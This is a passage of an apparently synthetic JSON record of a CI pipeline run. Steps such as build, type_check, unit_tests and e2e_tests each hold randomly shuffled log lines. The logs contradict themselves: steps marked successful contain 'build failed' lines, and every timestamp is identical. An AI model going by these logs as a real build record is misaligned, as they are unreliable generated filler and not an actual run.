          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-1912",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_db_connect",
          "Step 9/10: Building",
          "[12:00:33] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing jest@4.15.0",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (500ms)",
          "[12:00:33] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 5/10: Building",
          "  PASS: test_api_health (106ms)",
          "Cache hit for key-7970",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-6757",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_db_connect (63ms)",
          "  PASS: test_db_connect (123ms)",
          "Cache hit for key-5903",
          "\u2713 build completed",
          "Installing express@1.15.0",
          "Installing axios@3.14.0",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/main.py...",
          "Installing jest@3.10.0",
          "Step 3/10: Building",
          "Step 6/10: Building",
          "Installing axios@1.6.0",
          "Installing axios@4.13.0",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-3728",
          "  PASS: test_cache_hit (261ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-6798",
          "Cache hit for key-8329",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Cache hit for key-7873",
          "Cache hit for key-7214",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 test completed",
          "Cache hit for key-9093",
          "  PASS: test_api_health (96ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Compiling src/app.ts...",
          "Installing axios@1.8.0",
          "Installing eslint@3.6.0",
          "  PASS: test_auth_login (205ms)",
          "Installing prettier@2.18.0",
          "Installing express@3.18.0",
          "[12:00:33] INFO: Processing request",
          "Installing prettier@2.1.0",
          "Cache hit for key-7924",
          "Installing jest@5.6.0",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-2720",
          "Step 4/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-3569",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-4055",
          "[12:00:33] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-1454",
          "  PASS: test_db_connect (149ms)",
          "Installing lodash@1.1.0",
          "FAILED: test_db_connect",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (446ms)",
          "  PASS: test_user_create (49ms)",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (296ms)",
          "\u2713 build completed",
          "Installing express@5.19.0",
          "\u2713 build completed",
          "Installing eslint@3.2.0",
          "\u2713 lint completed",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-20T12:00:46.433465",
        "finished_at": "2025-12-20T12:01:25.090471",
        "log_lines": [
          "=== Step: build ===",
          "Installing jest@1.4.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_db_connect (443ms)",
          "\u2713 build completed",
          "[12:00:33] INFO: Processing request",
          "Installing react@2.15.0",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-1926",
          "  PASS: test_auth_login (434ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-4027",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_user_create (216ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_db_connect (77ms)",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "[12:00:33] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_api_health (484ms)",
          "Step 6/10: Building",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Installing react@1.1.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:33] INFO: Processing request",
          "Installing prettier@2.19.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 5/10: Building",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (233ms)",
          "Cache hit for key-8047",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Cache hit for key-9876",
          "[12:00:33] WARN: Deprecated API usage",
          "[12:00:33] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_db_connect (275ms)",
          "  PASS: test_api_health (90ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:33] INFO: Processing request",
          "Step 6/10: Building",
          "Installing lodash@5.0.0",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (26MB)",
          "  PASS: test_user_create (383ms)",
          "WARNING: express has known vulnerabilities",
          "Installing jest@4.11.0",
          "Cache hit for key-9358",
          "\u2713 test completed",
          "  PASS: test_auth_login (224ms)",
          "Cache hit for key-1413",
          "\u2713 test completed",
          "\u2717 build failed with exit code 70",
          "[12:00:33] WARN: Deprecated API usage",
          "[12:00:33] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_api_health (164ms)",
          "Cache hit for key-6213",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 9/10: Building",
          "[12:00:33] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-7277",
          "Installing express@1.8.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:33] INFO: Processing request",
          "Installing lodash@1.0.0",
          "  PASS: test_auth_login (372ms)",
          "Cache hit for key-1897",
          "Step 2/10: Building",
          "Installing react@2.2.0",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-6230",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-2527",
          "  PASS: test_db_connect (343ms)",
          "Step 7/10: Building",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_cache_hit (395ms)",
          "\u2717 build failed with exit code 7",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "[12:00:33] INFO: Processing request",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-5087",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (183ms)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-9132",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-3820",
          "Cache hit for key-3413",
          "Installing axios@1.16.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing eslint@4.10.0",
          "[12:00:33] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 3/10: Building",
          "Cache hit for key-1898",
          "  PASS: test_user_create (346ms)",
          "[12:00:33] INFO: Processing request",
          "Installing prettier@5.17.0",
          "Cache hit for key-2398",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing express@3.3.0",
          "Cache hit for key-1504",
          "  PASS: test_db_connect (302ms)",
          "Installing prettier@2.7.0",
          "  PASS: test_auth_login (222ms)",
          "Cache hit for key-1205",
          "  PASS: test_user_create (132ms)",
          "Cache hit for key-4538",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-20T12:01:25.090471",
        "finished_at": "2025-12-20T12:01:37.976140",
        "log_lines": [
          "=== Step: setup_environment ===",
          "\u2713 test completed",
          "[12:00:33] WARN: Deprecated API usage",
          "Installing eslint@5.16.0",
          "Cache hit for key-4054",
          "\u2717 build failed with exit code 119",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "Cache hit for key-6113",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "\u2713 build completed",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-3766",
          "\u2713 build completed",
          "Cache hit for key-6133",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 5/10: Building",
          "[12:00:33] WARN: Deprecated API usage",
          "Cache hit for key-7703",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-5723",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-9417",
          "Cache hit for key-2841",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u2713 test completed",
          "Installing prettier@3.15.0",
          "  PASS: test_db_connect (108ms)",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Installing prettier@2.15.0",
          "WARNING: jest has known vulnerabilities",
          "Installing axios@4.2.0",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:33] ERROR: Connection failed",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_db_connect (7ms)",
          "Step 10/10: Building",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-9434",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Cache hit for key-4527",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Installing lodash@2.3.0",
          "Cache hit for key-3486",
          "  PASS: test_api_health (103ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Step 5/10: Building",
          "Cache hit for key-9089",
          "Cache hit for key-7515",
          "WARNING: react has known vulnerabilities",
          "Step 4/10: Building",
          "Installing jest@4.3.0",
          "[12:00:33] WARN: Deprecated API usage",
          "  PASS: test_db_connect (110ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_user_create (190ms)",
          "Cache hit for key-6240",
          "Cache hit for key-8527",
          "\u2713 build completed",
          "Step 4/10: Building",
          "  PASS: test_api_health (2ms)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing axios@2.10.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (270ms)",
          "Installing webpack@1.10.0",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Cache hit for key-2716",
          "Cache hit for key-3039",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "Installing eslint@5.10.0",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (107ms)",
          "Cache hit for key-4128",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/main.py...",
          "Installing express@3.2.0",
          "WARNING: react has known vulnerabilities",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "WARNING: eslint has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "Installing express@2.10.0",
          "Installing axios@4.19.0",
          "\u2713 build completed",
          "Cache hit for key-3638",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-3300",
          "Step 8/10: Building",
          "  PASS: test_user_create (239ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-7320",
          "  PASS: test_user_create (131ms)",
          "Installing express@1.17.0",
          "  PASS: test_cache_hit (185ms)",
          "  PASS: test_db_connect (321ms)",
          "Installing jest@1.1.0",
          "Cache hit for key-2938",
          "Cache hit for key-7877",
          "Installing express@5.15.0",
          "Step 8/10: Building",
          "  PASS: test_db_connect (27ms)",
          "Exception: ValueError",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-20T12:01:37.976140",
        "finished_at": "2025-12-20T12:01:50.861809",
        "log_lines": [
          "=== Step: type_check ===",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "Step 2/10: Building",
          "\u2713 build completed",
          "[12:00:33] WARN: Deprecated API usage",
          "Cache hit for key-5349",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-2055",
          "[12:00:33] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/handler.rs...",
          "[12:00:33] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-7063",
          "Step 6/10: Building",
          "Cache hit for key-7035",
          "  PASS: test_api_health (83ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "WARNING: prettier has known vulnerabilities",
          "Step 9/10: Building",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "  PASS: test_db_connect (467ms)",
          "Cache hit for key-5286",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-8364",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-3089",
          "\u2713 build completed",
          "Cache hit for key-7606",
          "  PASS: test_auth_login (181ms)",
          "Installing webpack@4.16.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "  PASS: test_api_health (290ms)",
          "\u2713 test completed",
          "Installing prettier@5.0.0",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-8026",
          "[12:00:33] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "[12:00:33] INFO: Processing request",
          "Installing express@2.13.0",
          "FAILED: test_cache_hit",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_user_create (290ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "Installing jest@5.18.0",
          "Installing react@1.2.0",
          "Installing express@3.1.0",
          "Installing webpack@5.10.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:33] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/utils.go...",
          "Installing jest@5.3.0",
          "Compiling src/handler.rs...",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-4223",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing webpack@5.1.0",
          "Exception: RuntimeError",
          "Installing webpack@2.10.0",
          "Cache hit for key-2481",
          "Step 8/10: Building",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:33] WARN: Deprecated API usage",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-6667",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Installing axios@3.6.0",
          "  PASS: test_api_health (49ms)",
          "Installing react@5.19.0",
          "Step 4/10: Building",
          "Installing prettier@1.14.0",
          "Cache hit for key-1484",
          "\u2717 build failed with exit code 99",
          "  PASS: test_cache_hit (184ms)",
          "Compiling src/index.js...",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-1952",
          "\u2713 lint completed",
          "  PASS: test_user_create (375ms)",
          "Cache hit for key-5321",
          "\u2713 test completed",
          "Installing jest@1.0.0",
          "Installing axios@5.20.0",
          "FAILED: test_cache_hit",
          "Cache hit for key-9444",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u2713 test completed",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 7/10: Building",
          "Installing eslint@4.15.0",
          "Cache hit for key-1736",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-5552",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-4975",
          "Cache hit for key-8888",
          "  PASS: test_db_connect (238ms)",
          "Installing express@1.3.0",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-20T12:01:50.861809",
        "finished_at": "2025-12-20T12:02:29.518815",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Compiling src/main.py...",
          "  PASS: test_user_create (445ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Exception: ValueError",
          "\u2713 build completed",
          "Cache hit for key-5933",
          "Installing prettier@2.13.0",
          "[12:00:33] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "[12:00:33] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (34ms)",
          "  PASS: test_user_create (351ms)",
          "Cache hit for key-3833",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "WARNING: lodash has known vulnerabilities",
          "Step 8/10: Building",
          "\u2713 test completed",
          "  PASS: test_db_connect (381ms)",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:33] INFO: Processing request",
          "Compiling src/utils.go...",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_api_health (24ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 build completed",
          "Installing jest@3.18.0",
          "Installing express@2.6.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/main.py...",
          "Installing eslint@3.2.0",
          "Installing prettier@3.11.0",
          "\u2713 build completed",
          "Installing react@1.13.0",
          "Installing lodash@1.8.0",
          "Compiling src/service.java...",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "WARNING: jest has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "Step 10/10: Building",
          "[12:00:33] INFO: Processing request",
          "Step 4/10: Building",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-1948",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing prettier@5.1.0",
          "Cache hit for key-8690",
          "Step 10/10: Building",
          "Cache hit for key-6319",
          "Step 3/10: Building",
          "Step 5/10: Building",
          "Compiling src/main.py...",
          "Installing react@1.14.0",
          "  PASS: test_cache_hit (482ms)",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Cache hit for key-2672",
          "Installing webpack@5.7.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-5439",
          "Installing prettier@1.7.0",
          "[12:00:33] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_api_health (27ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing jest@2.9.0",
          "Compiling src/utils.go...",
          "Cache hit for key-6098",
          "[12:00:33] ERROR: Connection failed",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Step 4/10: Building",
          "Installing prettier@3.11.0",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_user_create (223ms)",
          "Step 6/10: Building",
          "Cache hit for key-7869",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:33] INFO: Processing request",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing eslint@1.11.0",
          "[12:00:33] ERROR: Connection failed",
          "Installing lodash@1.15.0",
          "Cache hit for key-5493",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_user_create (274ms)",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "[12:00:33] INFO: Processing request",
          "Installing prettier@3.11.0",
          "Installing react@3.9.0",
          "Step 9/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "Installing lodash@2.12.0",
          "Installing axios@3.1.0",
          "Cache hit for key-2031",
          "Step 8/10: Building",
          "[12:00:33] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-3635",
          "[12:00:33] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing jest@3.18.0",
          "  PASS: test_api_health (50ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing jest@5.17.0",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-7900",
          "\u2713 lint completed",
          "Installing webpack@5.16.0",
          "Step 7/10: Building",
          "Cache hit for key-3865",
          "Cache hit for key-3575",
          "  PASS: test_cache_hit (292ms)",
          "Compiling src/handler.rs...",
          "Installing react@5.7.0",
          "  PASS: test_user_create (112ms)",
          "Installing jest@4.2.0",
          "Cache hit for key-3379",
          "Step 4/10: Building",
          "Cache hit for key-3223",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-20T12:02:29.518815",
        "finished_at": "2025-12-20T12:02:42.404484",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:33] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_auth_login (304ms)",
          "  PASS: test_auth_login (13ms)",
          "Compiling src/handler.rs...",
          "Installing prettier@5.18.0",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 5/10: Building",
          "Step 2/10: Building",
          "  PASS: test_db_connect (492ms)",
          "[12:00:33] INFO: Processing request",
          "Installing prettier@3.8.0",
          "[12:00:33] ERROR: Connection failed",
          "Step 5/10: Building",
          "Installing express@1.9.0",
          "Cache hit for key-6285",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "[12:00:33] WARN: Deprecated API usage",
          "Installing jest@2.2.0",
          "  PASS: test_db_connect (159ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:33] WARN: Deprecated API usage",
          "Installing express@3.9.0",
          "Step 4/10: Building",
          "WARNING: express has known vulnerabilities",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 lint completed",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-4845",
          "\u2713 test completed",
          "Installing jest@1.16.0",
          "Step 9/10: Building",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "[12:00:33] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:33] INFO: Processing request",
          "Installing webpack@5.7.0",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_user_create (308ms)",
          "[12:00:33] INFO: Processing request",
          "Installing prettier@3.1.0",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "Cache hit for key-7093",
          "Step 10/10: Building",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "[12:00:33] INFO: Processing request",
          "Step 5/10: Building",
          "Installing react@1.8.0",
          "Step 2/10: Building",
          "Cache hit for key-6222",
          "Compiling src/index.js...",
          "Installing webpack@5.20.0",
          "Step 4/10: Building",
          "Installing prettier@3.17.0",
          "\u2713 lint completed",
          "[12:00:33] INFO: Processing request",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u2713 lint completed",
          "Cache hit for key-6130",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "[12:00:33] ERROR: Connection failed",
          "Step 6/10: Building",
          "  PASS: test_auth_login (109ms)",
          "Compiling src/app.ts...",
          "Installing react@4.19.0",
          "  PASS: test_api_health (327ms)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_cache_hit (141ms)",
          "  PASS: test_auth_login (310ms)",
          "Cache hit for key-2308",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:33] INFO: Processing request",
          "Installing eslint@5.15.0",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "Installing react@1.8.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_user_create (35ms)",
          "[12:00:33] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_auth_login (379ms)",
          "Step 7/10: Building",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_cache_hit (104ms)",
          "Cache hit for key-1138",
          "  PASS: test_user_create (423ms)",
          "Installing react@3.15.0",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (187ms)",
          "Installing webpack@3.3.0",
          "Installing axios@2.12.0",
          "[12:00:33] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:33] INFO: Processing request",
          "Compiling src/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 build completed",
          "Installing prettier@2.8.0",
          "Installing express@2.7.0",
          "  PASS: test_user_create (118ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 7/10: Building",
          "FAILED: test_user_create",
          "Installing axios@1.16.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:33] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-2213",
          "Compiling src/handler.rs...",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-20T12:02:42.404484",
        "finished_at": "2025-12-20T12:03:21.061490",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "\u2713 build completed",
          "Cache hit for key-4766",
          "Installing lodash@5.13.0",
          "Installing express@4.7.0",
          "Installing express@5.17.0",
          "Cache hit for key-9096",
          "Step 2/10: Building",
          "Step 3/10: Building",
          "[12:00:33] ERROR: Connection failed",
          "[12:00:33] ERROR: Connection failed",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Exception: RuntimeError",
          "Cache hit for key-5164",
          "\u2713 test completed",
          "Installing lodash@3.15.0",
          "Installing webpack@1.19.0",
          "\u2713 lint completed",
          "Cache hit for key-4830",
          "Step 9/10: Building",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/service.java...",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "\u2717 build failed with exit code 78",
          "\u2713 test completed",
          "\u2713 build completed",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 4/10: Building",
